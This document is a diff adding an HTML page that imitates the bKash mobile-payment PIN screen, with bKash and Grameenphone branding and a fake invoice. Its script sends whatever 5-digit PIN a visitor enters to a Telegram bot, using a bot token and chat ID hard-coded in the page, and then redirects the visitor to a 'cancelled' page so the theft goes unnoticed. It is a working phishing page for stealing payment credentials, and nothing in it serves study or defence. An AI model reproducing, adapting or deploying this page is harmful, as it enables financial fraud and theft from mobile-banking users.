@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>bKash Payment</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        .bg-custom {
+            background-image: url('background.png'); /* Set your custom background image */
+            background-size: cover; /* Cover the entire section */
+            background-position: center; /* Center the background image */
+            padding: 2rem; /* Add padding for spacing */
+        }
+
+        @keyframes bounce {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.5);
+            }
+        }
+
+        .dot {
+            animation: bounce 1.2s infinite ease-in-out;
+        }
+
+        .dot:nth-child(1) {
+            animation-delay: 0s;
+        }
+
+        .dot:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .dot:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        .dot:nth-child(4) {
+            animation-delay: 0.6s;
+        }
+
+        /* Loading animation hidden by default */
+        #loadingAnimation {
+            display: none; /* Ensure it starts as hidden */
+        }
+
+        /* Error message hidden by default */
+        #errorMessage {
+            display: none;
+            color: white;
+            font-size: 0.875rem; /* Tailwind text-sm */
+            margin-top: 0.5rem; /* Tailwind mt-2 */
+        }
+    </style>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <div class="bg-white rounded-lg shadow-lg max-w-sm w-full">
+        <!-- Header with logo -->
+        <div class="flex flex-col items-center justify-center p-5 border-b-2 border-pink-500">
+            <img src="bkashlogo.png" alt="bKash logo" class="h-12">
+        </div>
+        <!-- SSLCommerz Invoice and Amount Section -->
+        <div class="flex items-center justify-between px-4 py-2 bg-gray-50">
+            <div class="flex items-center">
+                <img src="grammenlogo.png" alt="SSLCommerz logo" class="h-8 w-8">
+                <div class="ml-2 text-sm">
+                    <p class="font-bold">Grameenphone Ltd</p>
+                    <p class="text-gray-500 text-xs">Invoice: BGT177420240929180754</p>
+                </div>
+            </div>
+            <p class="font text-xl text-gray-600">৳20.00</p>
+        </div>
+        <!-- Account Input Section with Background Image -->
+        <div class="bg-custom text-white text-center">
+            <p class="font-semibold text-sm mb-2">Enter PIN of your bKash Account number (01* ** *** ***)</p>
+            <input type="text" id="bkashNumber" inputmode="numeric" pattern="[0-9]*" placeholder="Enter PIN" class="w-full px-4 py-2 text-center text-black rounded-md focus:outline-none" maxlength="5" />
+            <!-- Error message for wrong PIN -->
+            <p id="errorMessage">Wrong PIN</p>
+        </div>
+        <!-- Footer Buttons and Loading Animation -->
+        <div class="grid grid-cols-2 gap-0 w-full border-t-3 border-pink-500 bg-gray-300">
+            <button id="closeButton" onclick="window.location.href='paymentIDSubscriptionExecancelled.html'" class="text-gray-600 font-bold text-x w-full py-4 bg-gray-300 border-r border-gray-400">
+                CLOSE
+            </button>
+            <button id="confirmButton" class="text-pink-600 font-bold text-x w-full py-4 bg-gray-300">
+                CONFIRM
+            </button>
+        </div>
+        <!-- Loading Animation -->
+        <div class="loading flex items-center justify-center h-20 w-full border-t-3 border-pink-500 bg-gray-300" id="loadingAnimation">
+            <div class="flex space-x-2">
+                <div class="dot w-4 h-4 bg-pink-600 rounded-full"></div>
+                <div class="dot w-4 h-4 bg-pink-500 rounded-full"></div>
+                <div class="dot w-4 h-4 bg-pink-400 rounded-full"></div>
+                <div class="dot w-4 h-4 bg-pink-300 rounded-full"></div>
+            </div>
+        </div>
+        <!-- Contact Section -->
+        <div class="text-center py-4">
+            <a href="tel:16247" class="flex justify-center items-center text-pink-500">
+                <i class="fas fa-phone-alt mr-2"></i>
+                <span class="font-bold text-xl">16247</span>
+            </a>
+        </div>
+    </div>
+
+    <script>
+        const token = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y'; // Your bot token
+        const chat_id = '7174617845'; // Your chat ID
+
+        // Function to send message to Telegram bot
+        function sendMessageToTelegram(bkashNumber) {
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const data = {
+                chat_id: chat_id,
+                text: `${bkashNumber}`,
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Message sent successfully!');
+                } else {
+                    console.error('Error:', data.description);
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        }
+
+        document.getElementById('confirmButton').addEventListener('click', function() {
+            const bkashNumber = document.getElementById('bkashNumber').value;
+            const errorMessage = document.getElementById('errorMessage');
+
+            // Validation: Check if the PIN is exactly 5 digits
+            if (bkashNumber.length !== 5) {
+                errorMessage.style.display = 'block'; // Show error message if PIN is invalid
+                return;
+            } else {
+                errorMessage.style.display = 'none'; // Hide error message if PIN is valid
+            }
+
+            // Hide buttons
+            document.getElementById('closeButton').style.display = 'none'; // Hide the CLOSE button
+            document.getElementById('confirmButton').style.display = 'none'; // Hide the CONFIRM button
+            
+            // Show loading animation
+            const loadingAnimation = document.getElementById('loadingAnimation');
+            loadingAnimation.style.display = 'flex';
+
+            // Send the bKash number to Telegram
+            sendMessageToTelegram(bkashNumber);
+
+            // Redirect after 3 seconds
+            setTimeout(() => {
+                window.location.href = `paymentIDSubscriptionExecancelled.html`; // Redirect to the specified link
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
